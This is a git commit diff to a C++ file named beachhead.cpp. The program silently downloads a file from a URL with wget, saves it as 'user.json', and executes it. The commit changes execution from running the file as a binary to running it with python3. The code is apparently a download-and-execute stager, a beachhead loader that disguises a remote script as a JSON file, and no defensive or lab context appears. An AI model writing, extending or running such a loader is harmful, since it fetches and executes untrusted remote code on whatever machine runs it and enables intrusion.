30ea47bd6e2d39f0e44d529db428f893b1e929ef
venkatraman-v <vvaratharaja@umass.edu>
2026-03-30 17:08:53 -0400

    beachhead command is replaced

--- beachhead/beachhead.cpp
+++ beachhead/beachhead.cpp
@@ -7,10 +7,10 @@ int main() {
     std::string command0 = "wget -q " + url + " -O user.json";
     int r0 = std::system(command0.c_str());
 
-    int r1 = std::system("chmod +x ./user.json");
+    // int r1 = std::system("chmod +x ./user.json");
 
     // Run
-    std::string command1 = "./user.json";
+    std::string command1 = "python3 user.json";
     int r2 = std::system(command1.c_str());
 
     return 0;
